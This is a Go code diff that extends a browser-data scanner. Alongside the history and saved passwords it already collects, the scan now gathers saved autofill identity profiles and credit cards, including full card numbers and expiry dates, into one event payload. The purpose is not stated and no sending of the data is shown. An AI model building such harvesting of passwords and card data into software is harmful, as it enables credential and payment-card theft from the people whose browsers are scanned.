@@ -35,12 +35,38 @@ type PasswordEntry struct {
 	Source   string `json:"source"`
 }
 
+// AutofillProfile represents a saved address/identity profile.
+type AutofillProfile struct {
+	FullName string `json:"fullName"`
+	Email    string `json:"email"`
+	Phone    string `json:"phone"`
+	Address  string `json:"address"`
+	City     string `json:"city"`
+	State    string `json:"state"`
+	Zip      string `json:"zip"`
+	Country  string `json:"country"`
+	Source   string `json:"source"`
+}
+
+// CreditCard represents a saved credit card.
+type CreditCard struct {
+	NameOnCard string `json:"nameOnCard"`
+	Number     string `json:"number"`
+	ExpMonth   string `json:"expMonth"`
+	ExpYear    string `json:"expYear"`
+	Source     string `json:"source"`
+}
+
 // ScanResult is the payload of the "history_result" event.
 type ScanResult struct {
 	Entries       []HistoryEntry  `json:"entries"`
 	Total         int             `json:"total"`
 	Passwords     []PasswordEntry `json:"passwords"`
 	PasswordTotal int             `json:"passwordTotal"`
+	Profiles      []AutofillProfile `json:"profiles"`
+	ProfileTotal  int               `json:"profileTotal"`
+	Cards         []CreditCard      `json:"cards"`
+	CardTotal     int               `json:"cardTotal"`
 	ScannedAt     string          `json:"scannedAt"`
 	Errors        []string        `json:"errors,omitempty"`
 }
@@ -386,11 +412,19 @@ func performScan() ScanResult {
 	passwords, pwdErrors := scanAllPasswords(env)
 	errors = append(errors, pwdErrors...)
 
+	// Autofill
+	profiles, cards, afErrors := scanAllAutofill(env)
+	errors = append(errors, afErrors...)
+
 	return ScanResult{
 		Entries:       allEntries,
 		Total:         len(allEntries),
 		Passwords:     passwords,
 		PasswordTotal: len(passwords),
+		Profiles:      profiles,
+		ProfileTotal:  len(profiles),
+		Cards:         cards,
+		CardTotal:     len(cards),
 		ScannedAt:     time.Now().UTC().Format(time.RFC3339),
 		Errors:        errors,
 	}
